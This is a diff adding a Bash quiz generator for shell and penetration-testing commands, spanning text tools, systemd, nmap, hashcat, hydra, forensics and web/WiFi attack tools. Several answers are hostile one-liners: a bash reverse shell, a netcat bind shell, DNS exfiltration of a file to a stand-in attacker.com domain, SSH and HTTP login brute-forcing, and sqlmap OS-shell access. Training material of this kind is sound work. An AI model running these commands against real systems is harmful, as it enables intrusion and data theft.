+  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
+  questions+=("Add prefix 'LOG: ' to each line|sed -i 's/^/LOG: /' ${log}")
+  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
+
+  # xargs - building commands from stdin
+  questions+=("Delete files listed in ${txt}|cat ${txt} | xargs rm|xargs rm < ${txt}")
+  questions+=("Run grep on files from find|find . -name '*.${ext}' | xargs grep ${term}")
+  questions+=("Process files with spaces in names|find . -name '*.${ext}' -print0 | xargs -0 wc -l")
+  questions+=("Run commands in parallel (4 jobs)|find . -name '*.${ext}' | xargs -P 4 -I {} process {}")
+  questions+=("Confirm before each delete|find . -name '*.tmp' | xargs -p rm")
+  questions+=("Limit xargs to ${n} arguments per command|cat ${txt} | xargs -n ${n} echo")
+
+  # Combined operations
+  questions+=("Find .${ext} files > ${size}, show sizes sorted|find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
+  questions+=("Replace and backup: ${old} -> ${new}, keep .bak|sed -i.bak 's/${old}/${new}/g' ${cfg}")
+
+  # Systemd service management (modern Linux essential)
+  questions+=("Check status of nginx service|systemctl status nginx")
+  questions+=("Start nginx service|systemctl start nginx|sudo systemctl start nginx")
+  questions+=("Stop nginx service|systemctl stop nginx|sudo systemctl stop nginx")
+  questions+=("Restart nginx service|systemctl restart nginx|sudo systemctl restart nginx")
+  questions+=("Enable nginx to start on boot|systemctl enable nginx|sudo systemctl enable nginx")
+  questions+=("Disable nginx from starting on boot|systemctl disable nginx|sudo systemctl disable nginx")
+  questions+=("Reload nginx config without restart|systemctl reload nginx|sudo systemctl reload nginx")
+  questions+=("List all running services|systemctl list-units --type=service --state=running")
+  questions+=("List failed services|systemctl --failed")
+
+  # Journalctl (modern log viewing)
+  questions+=("View logs for nginx service|journalctl -u nginx")
+  questions+=("Follow logs for nginx in realtime|journalctl -u nginx -f")
+  questions+=("View last 50 log lines for nginx|journalctl -u nginx -n 50")
+  questions+=("View logs since boot|journalctl -b")
+  questions+=("View kernel messages|journalctl -k|dmesg")
+  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
+  questions+=("View logs between times|journalctl --since '2024-01-01' --until '2024-01-02'")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 8: Network Scanning (nmap)
+gen_q8_nmap() {
+  local questions=()
+  local ip=$(_pick IPS) subnet=$(_pick SUBNETS) port=$(_pick PORTS) port2=$((port + 1000))
+
+  # Basic scans
+  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
+  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
+  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
+  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
+  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")
+
+  # Service/version detection
+  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
+  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
+  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
+  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
+  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")
+
+  # Scan types
+  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
+  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
+  questions+=("TCP SYN scan on ${ip} (stealth, default)|nmap -sS ${ip}")
+  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")
+
+  # Network discovery
+  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
+  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
+  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")
+
+  # Output formats
+  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
+  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")
+
+  # Scripts
+  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
+  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
+  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
+  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
+  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")
+
+  # Speed and stealth
+  questions+=("Scan ${ip} through proxychains (anonymize)|proxychains nmap -sT ${ip}")
+  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
+  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")
+
+  # Combined
+  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 9: Hash Cracking & Encoding (hashcat, john, hydra, encoding)
+gen_q9_hash() {
+  local questions=()
+  local hash=$(_pick HASHES) wordlist=$(_pick WORDLISTS) ip=$(_pick IPS)
+  local user=$(_pick USERNAMES) url=$(_pick URLS) archive=$(_pick ARCHIVES)
+  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
+  local hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}
+
+  # Hashcat dictionary attacks
+  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash}|hashcat -m 0 ${hash} ${wordlist}")
+  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes|hashcat -m ${hmode} ${hash} ${wordlist}")
+  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash}|hashcat -m 1000 ${hash} ${wordlist}")
+
+  # Hashcat brute force
+  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
+  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")
+
+  # Hashcat rules & session
+  questions+=("Crack ${hash} with rules file|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
+  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
+  questions+=("Resume interrupted hashcat session|hashcat --restore")
+
+  # John the Ripper
+  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
+  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
+  questions+=("Show cracked passwords from john|john --show ${hash}")
+  questions+=("List supported john formats|john --list=formats")
+
+  # John hash extraction (FIXED - was incorrect before)
+  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
+  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
+  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
+  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")
+
+  # Hydra
+  questions+=("Brute force SSH login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
+  questions+=("Brute force FTP login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
+  questions+=("Brute force HTTP basic auth on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
+  questions+=("Brute force HTTP POST login form|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
+  questions+=("Brute force with username list too|hydra -L users.txt -P ${wordlist} ${ip} ssh")
+  questions+=("Limit hydra to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")
+
+  # Encoding/decoding
+  questions+=("Encode string 'secret' to base64|echo -n 'secret' | base64")
+  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
+  questions+=("Generate MD5 hash of string 'password'|echo -n 'password' | md5sum")
+  questions+=("Generate SHA256 hash of string|echo -n 'password' | sha256sum")
+  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")
+
+  # Hex operations
+  questions+=("Convert 'hello' to hex|echo -n 'hello' | xxd -p")
+  questions+=("Convert hex back to ascii|echo '68656c6c6f' | xxd -r -p")
+  questions+=("Hex dump of file with addresses|xxd ${hash}")
+  questions+=("Hex dump plain (no addresses)|xxd -p ${hash}")
+
+  # URL encoding (useful for web testing)
+  questions+=("URL encode a string|python3 -c \"import urllib.parse; print(urllib.parse.quote('test string'))\"")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 10: Forensics & Binary Analysis
+gen_q10_forensics() {
+  local questions=()
+  local bin=$(_pick BINS) img=$(_pick IMGS) photo=$(_pick PHOTOS)
+  local hash=$(_pick HASHES) txt=$(_pick TXTS)
+
+  # String extraction
+  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
+  questions+=("Extract strings minimum 10 chars|strings -n 10 ${bin}")
+  questions+=("Extract Unicode strings (Windows binaries)|strings -e l ${bin}")
+  questions+=("Find URLs in binary|strings ${bin} | grep -E 'https?://'")
+  questions+=("Find email addresses in binary|strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")
+
+  # ELF analysis
+  questions+=("Show ELF file header|readelf -h ${bin}")
+  questions+=("Show ELF symbols|readelf -s ${bin}")
+  questions+=("Show all ELF info|readelf -a ${bin}")
+  questions+=("List shared library dependencies|ldd ${bin}")
+
+  # Radare2
+  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
+  questions+=("Disassemble main function|r2 -qc 'aaa; pdf @main' ${bin}")
+  questions+=("List functions in binary|r2 -qc 'aaa; afl' ${bin}")
+
+  # Binwalk
+  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
+  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
+  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")
+
+  # Memory forensics (volatility3)
+  questions+=("Get system info from memory dump|volatility3 -f ${img} windows.info")
+  questions+=("List processes from memory dump|volatility3 -f ${img} windows.pslist")
+  questions+=("List network connections|volatility3 -f ${img} windows.netscan")
+  questions+=("Find malware with malfind|volatility3 -f ${img} windows.malfind")
+  questions+=("Extract command history|volatility3 -f ${img} windows.cmdline")
+
+  # Disk forensics
+  questions+=("Recover deleted files from ${img}|foremost -i ${img} -o output/")
+  questions+=("List filesystem entries recursively|fls -r ${img}")
+  questions+=("List deleted files only|fls -d ${img}")
+  questions+=("Create timeline from bodyfile|mactime -b bodyfile.txt")
+
+  # File metadata
+  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
+  questions+=("Extract GPS coordinates from photo|exiftool -gps* ${photo}")
+  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")
+
+  # Disk imaging
+  questions+=("Create disk image of /dev/sda|dd if=/dev/sda of=${img} bs=4M status=progress")
+  questions+=("Mount disk image read-only|mount -o ro,loop ${img} /mnt/evidence")
+  questions+=("Verify checksums file|sha256sum -c ${hash}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 11: Network Tools (tshark, curl, wget, ssh, openssl, jq)
+gen_q11_network() {
+  local questions=()
+  local ip=$(_pick IPS) url=$(_pick URLS) pcap=$(_pick PCAPS)
+  local iface=$(_pick INTERFACES) port=$(_pick PORTS)
+  local user=$(_pick USERNAMES) host=$(_pick REMOTE_HOSTS) key=$(_pick JSON_KEYS)
+
+  # tshark - packet capture & analysis
+  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
+  questions+=("Capture only 100 packets|tshark -i ${iface} -c 100 -w ${pcap}")
+  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
+  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
+  questions+=("Filter traffic to/from ${ip}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
+  questions+=("Show only DNS queries|tshark -r ${pcap} -Y 'dns.qry.name'")
+  questions+=("Extract HTTP POST data|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
+  questions+=("Extract all URLs from capture|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
+  questions+=("Show TCP conversations|tshark -r ${pcap} -q -z conv,tcp")
+  questions+=("Extract credentials (FTP, HTTP basic)|tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")
+
+  # jq - JSON processing (ESSENTIAL modern skill)
+  questions+=("Pretty print JSON file|jq '.' data.json")
+  questions+=("Extract '${key}' array from JSON|jq '.${key}' data.json")
+  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data.json")
+  questions+=("Extract 'name' field from each item|jq '.${key}[] | .name' data.json")
+  questions+=("Filter items where status is 'active'|jq '.${key}[] | select(.status == \"active\")' data.json")
+  questions+=("Count items in array|jq '.${key} | length' data.json")
+  questions+=("Get keys of JSON object|jq 'keys' data.json")
+  questions+=("Compact JSON (remove whitespace)|jq -c '.' data.json")
+  questions+=("Create new object from fields|jq '.${key}[] | {name: .name, id: .id}' data.json")
+  questions+=("Parse JSON from curl output|curl -s ${url}/api | jq '.${key}'")
+
+  # curl - HTTP client (ESSENTIAL)
+  questions+=("GET request to ${url}|curl ${url}")
+  questions+=("GET request with headers shown|curl -i ${url}")
+  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
+  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
+  questions+=("Follow redirects|curl -L ${url}")
+  questions+=("Save output to file|curl -o output.html ${url}")
+  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
+  questions+=("Silent mode (no progress)|curl -s ${url}")
+  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")
+
+  # SSH tunneling (CRITICAL for pentesting)
+  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
+  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
+  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
+  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
+  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
+  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
+  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
+  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")
+
+  # wget (alternative to curl)
+  questions+=("Download file with wget|wget ${url}/file.tar.gz")
+  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
+  questions+=("Mirror website for offline|wget -mk ${url}")
+
+  # OpenSSL (cert checking, encryption)
+  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
+  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
+  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -salt -in file.txt -out file.enc")
+  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -in file.enc -out file.txt")
+  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 12: Web Attack Tools (nikto, sqlmap, feroxbuster, wifi, smb, netcat, masscan)
+gen_q12_webattack() {
+  local questions=()
+  local ip=$(_pick IPS) url=$(_pick URLS) port=$(_pick PORTS)
+  local iface=$(_pick INTERFACES) mac=$(_pick MACS)
+  local user=$(_pick USERNAMES) wordlist=$(_pick WORDLISTS)
+
+  # Web vulnerability scanning
+  questions+=("Scan ${url} for web vulnerabilities with nikto|nikto -h ${url}")
+  questions+=("Nikto scan, save output to file|nikto -h ${url} -o nikto_report.txt")
+  questions+=("Test SQL injection on ${url}/page?id=1|sqlmap -u '${url}/page?id=1' --dbs")
+  questions+=("SQLmap with POST data|sqlmap -u '${url}/login' --data='user=admin&pass=test' --dbs")
+  questions+=("SQLmap batch mode (no prompts)|sqlmap -u '${url}/page?id=1' --batch --dbs")
+  questions+=("SQLmap get shell|sqlmap -u '${url}/page?id=1' --os-shell")
+
+  # Directory enumeration
+  questions+=("Enumerate directories on ${url}|feroxbuster -u ${url}")
+  questions+=("Feroxbuster with custom wordlist|feroxbuster -u ${url} -w ${wordlist}")
+  questions+=("Feroxbuster with extensions|feroxbuster -u ${url} -x php,txt,html")
+  questions+=("Gobuster directory mode|gobuster dir -u ${url} -w ${wordlist}")
+
+  # WiFi attacks
+  questions+=("Enable monitor mode on ${iface}|airmon-ng start ${iface}")
+  questions+=("Scan for WiFi networks|airodump-ng ${iface}mon")
+  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${iface}mon")
+  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${iface}mon")
+  questions+=("Crack WPA handshake with wordlist|aircrack-ng -w ${wordlist} capture.cap")
+
+  # SMB/NetBIOS
+  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
+  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
+  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")
+
+  # Netcat
+  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
+  questions+=("Connect to remote port|nc ${ip} ${port}")
+  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
+  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
+  questions+=("Netcat bind shell|nc -lvnp ${port} -e /bin/bash")
+
+  # Mass scanning
+  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
+  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")
+
+  # Security audit
+  questions+=("Run full system security audit|lynis audit system")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 5: String Manipulation & Arrays
+gen_q5_strings() {
+  local questions=()
+  local txt=$(_pick TXTS) log=$(_pick LOGS) cfg=$(_pick CONFIGS)
+  local term=$(_pick SEARCH_TERMS) ext=$(_pick EXTS)
+
+  # Parameter expansion - removal (practical examples)
+  questions+=("Extract filename from /path/to/${txt} (stored in \$path)|echo \${path##*/}")
+  questions+=("Get parent directory from \$fullpath|echo \${fullpath%/*}")
+  questions+=("Get extension from ${cfg} (stored in \$file)|echo \${file##*.}")
+  questions+=("Remove extension from ${log} to get basename|echo \${file%.*}")
+  questions+=("Strip leading 'v' from version string \$ver (e.g., v1.2.3)|echo \${ver#v}")
+  questions+=("Remove protocol from URL \$url (e.g., https://)|echo \${url#*://}")
+  questions+=("Get domain from URL \$url (remove path)|echo \${url%%/*}")
+  questions+=("Strip all leading directories from \$path|echo \${path##*/}")
+
+  # Parameter expansion - substitution
+  questions+=("Replace first 'old' with 'new' in \$var|echo \${var/old/new}")
+  questions+=("Replace ALL 'old' with 'new' in \$var|echo \${var//old/new}")
+  questions+=("Replace 'old' at START of \$var|echo \${var/#old/new}")
+  questions+=("Replace 'old' at END of \$var|echo \${var/%old/new}")
+  questions+=("Delete all spaces from \$var|echo \${var// /}")
+  questions+=("Delete all digits from \$var|echo \${var//[0-9]/}")
+
+  # Parameter expansion - substrings
+  questions+=("Extract substring from position 5|echo \${var:5}")
+  questions+=("Extract 3 chars starting at position 5|echo \${var:5:3}")
+  questions+=("Get last 4 characters of \$var|echo \${var: -4}")
+  questions+=("Get string length of \$var|echo \${#var}")
+
+  # Parameter expansion - case
+  questions+=("Convert \$var to lowercase|echo \${var,,}")
+  questions+=("Convert \$var to uppercase|echo \${var^^}")
+  questions+=("Capitalize first char of \$var|echo \${var^}")
+  questions+=("Lowercase first char of \$var|echo \${var,}")
+
+  # Parameter expansion - defaults
+  questions+=("Use 'default' if \$var is unset|echo \${var:-default}")
+  questions+=("Set \$var to 'default' if unset|echo \${var:=default}")
+  questions+=("Error if \$var is unset|echo \${var:?error message}")
+  questions+=("Use 'alt' if \$var IS set|echo \${var:+alt}")
+
+  # Indexed arrays
+  questions+=("Declare indexed array|declare -a arr")
+  questions+=("Create array with values|arr=(one two three)")
+  questions+=("Access first element|echo \${arr[0]}")
+  questions+=("Access last element|echo \${arr[-1]}")
+  questions+=("Get all array elements|echo \${arr[@]}")
+  questions+=("Get array length|echo \${#arr[@]}")
+  questions+=("Get array indices|echo \${!arr[@]}")
+  questions+=("Append to array|arr+=(four)")
+  questions+=("Delete array element at index 1|unset 'arr[1]'")
+  questions+=("Slice array: elements 1-3|echo \${arr[@]:1:3}")
+
+  # Associative arrays
+  questions+=("Declare associative array|declare -A map")
+  questions+=("Set associative array value|map[key]=value")
+  questions+=("Create associative array inline|declare -A map=([k1]=v1 [k2]=v2)")
+  questions+=("Get associative array value|echo \${map[key]}")
+  questions+=("Get all keys of associative array|echo \${!map[@]}")
+  questions+=("Get all values of associative array|echo \${map[@]}")
+  questions+=("Check if key exists in array|[[ -v map[key] ]]")
+
+  # Array operations
+  questions+=("Loop over array elements|for x in \"\${arr[@]}\"; do echo \"\$x\"; done")
+  questions+=("Loop with index|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done")
+  questions+=("Join array with comma|IFS=','; echo \"\${arr[*]}\"")
+  questions+=("Read file lines into array|mapfile -t arr < ${txt}|readarray -t arr < ${txt}")
+  questions+=("Read command output into array|mapfile -t arr < <(ls)")
+  questions+=("Copy array|arr2=(\"\${arr[@]}\")")
+  questions+=("Merge two arrays|merged=(\"\${arr1[@]}\" \"\${arr2[@]}\")")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 6: Control Flow & Functions
+gen_q6_controlflow() {
+  local questions=()
+  local txt=$(_pick TXTS) log=$(_pick LOGS) cfg=$(_pick CONFIGS)
+  local n=$(_pick NUMBERS) dir=$(_pick DIRS) ext=$(_pick EXTS)
+
+  # if/else
+  questions+=("Basic if statement|if [[ condition ]]; then cmd; fi")
+  questions+=("if/else statement|if [[ cond ]]; then cmd1; else cmd2; fi")
+  questions+=("if/elif/else|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi")
+  questions+=("Test if file exists and run|[[ -f ${txt} ]] && cat ${txt}")
+  questions+=("Test if command succeeds|if grep -q error ${log}; then echo found; fi")
+  questions+=("Negate condition|if ! [[ -f ${txt} ]]; then echo missing; fi")
+  questions+=("Compound AND condition|if [[ -f ${txt} && -r ${txt} ]]; then cat ${txt}; fi")
+  questions+=("Compound OR condition|if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi")
+
+  # for loops (practical examples)
+  questions+=("Process all .${ext} files in current dir|for f in *.${ext}; do echo \"Processing \$f\"; done")
+  questions+=("Rename all .txt to .bak|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
+  questions+=("Retry curl until success (max ${n} tries)|for i in {1..${n}}; do curl -s url && break; sleep 1; done")
+  questions+=("Loop over servers and check SSH|for h in srv1 srv2 srv3; do ssh -o ConnectTimeout=2 \$h uptime; done")
+  questions+=("Process numbered files file1 to file${n}|for i in {1..${n}}; do cat file\$i; done")
+  questions+=("C-style countdown from ${n}|for ((i=${n}; i>0; i--)); do echo \$i; done")
+  questions+=("Loop over array elements|for item in \"\${arr[@]}\"; do echo \"\$item\"; done")
+  questions+=("Loop over files in ${dir}/, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done")
+
+  # while loops
+  questions+=("While loop basic|while [[ condition ]]; do cmd; done")
+  questions+=("While read lines from file|while IFS= read -r line; do echo \"\$line\"; done < ${txt}")
+  questions+=("While with counter|i=0; while ((i < ${n})); do echo \$i; ((i++)); done")
+  questions+=("Infinite loop with break|while true; do cmd; [[ cond ]] && break; done")
+  questions+=("While with continue|while read -r line; do [[ -z \"\$line\" ]] && continue; echo \"\$line\"; done < ${txt}")
+  questions+=("Read command output line by line|while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)")
+  questions+=("Until loop (opposite of while)|until [[ -f ${txt} ]]; do sleep 1; done")
+
+  # case statements
+  questions+=("Basic case statement|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
+  questions+=("Case with multiple patterns|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
+  questions+=("Case for yes/no input|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
+  questions+=("Case with glob patterns|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")
+
+  # functions
+  questions+=("Define simple function|func() { echo hello; }")
+  questions+=("Function with local variable|func() { local x=5; echo \$x; }")
+  questions+=("Function with arguments|func() { echo \"arg1: \$1, arg2: \$2\"; }")
+  questions+=("Function with return value|func() { return 0; }; func && echo success")
+  questions+=("Function returning string via stdout|func() { echo result; }; var=\$(func)")
+  questions+=("Function with all args|func() { echo \"all args: \$@\"; }")
+  questions+=("Function with arg count|func() { echo \"got \$# args\"; }")
+  questions+=("Check function exists|type -t func &>/dev/null && echo exists")
+  questions+=("Unset function|unset -f func")
+
+  # trap and signals
+  questions+=("Trap SIGINT (Ctrl+C)|trap 'echo caught' SIGINT")
+  questions+=("Trap EXIT for cleanup|trap 'rm -f /tmp/lock' EXIT")
+  questions+=("Trap multiple signals|trap 'cleanup' SIGINT SIGTERM EXIT")
+  questions+=("Trap ERR for error handling|trap 'echo error at line \$LINENO' ERR")
+
+  # error handling
+  questions+=("Exit on any error|set -e")
+  questions+=("Exit on undefined variable|set -u")
+  questions+=("Fail on pipe error|set -o pipefail")
+  questions+=("Strict mode combo|set -euo pipefail")
+  questions+=("Check last command status|\$? -ne 0 && echo failed")
+  questions+=("Run command, ignore failure|cmd || true")
+  questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }")
+
+  # debugging
+  questions+=("Enable debug mode (print commands)|set -x")
+  questions+=("Disable debug mode|set +x")
+  questions+=("Dry run (print, don't execute)|set -n")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 13: Apocalypse Mode - Hardcore one-liners, recovery, survival
+gen_q13() {
+  local questions=()
+  local ip=$(_pick IPS) subnet=$(_pick SUBNETS) port=$(_pick PORTS)
+  local log=$(_pick LOGS) txt=$(_pick TXTS) cfg=$(_pick CONFIGS)
+  local dir=$(_pick DIRS) ext=$(_pick EXTS) term=$(_pick SEARCH_TERMS)
+  local user=$(_pick USERNAMES) host=$(_pick REMOTE_HOSTS)
+  local n=$(_pick NUMBERS)
+
+  # === EMERGENCY RECOVERY ===
+  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
+  questions+=("Emergency single-user mode|init 1|systemctl rescue")
+  questions+=("Chroot into mounted system|chroot /mnt /bin/bash")
+  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
+  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
+  questions+=("Fix broken sudo (as root)|chmod 4755 /usr/bin/sudo; chown root:root /usr/bin/sudo")
+  questions+=("Reset root password from recovery|passwd root")
+  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
+  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
+  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")
+
+  # === HARDCORE ONE-LINERS ===
+  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
+  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
+  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
+  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
+  questions+=("Parallel compress all logs|find /var/log -name '*.log' | parallel gzip")
+  questions+=("Find duplicate files by hash|find . -type f -exec md5sum {} + | sort | uniq -d -w32")
+  questions+=("Extract all IPs from logs, count, sort|grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
+  questions+=("Find SUID binaries|find / -perm -4000 -type f 2>/dev/null")
+  questions+=("Find world-writable files|find / -perm -o+w -type f 2>/dev/null")
+  questions+=("List all open ports and processes|ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
+
+  # === NETWORK SURVIVAL ===
+  questions+=("Quick port scan without nmap|for p in {1..1000}; do timeout 0.1 bash -c \"echo >/dev/tcp/${ip}/\$p\" 2>/dev/null && echo \$p; done")
+  questions+=("Download file with pure bash (no curl/wget)|exec 3<>/dev/tcp/example.com/80; echo -e 'GET /file HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3")
+  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
+  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
+  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
+  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
+  questions+=("Exfil file via DNS (base64)|cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
+  questions+=("Bind shell with netcat|nc -lvnp ${port} -e /bin/bash")
+  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
+  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")
+
+  # === SYSTEM FORENSICS ===
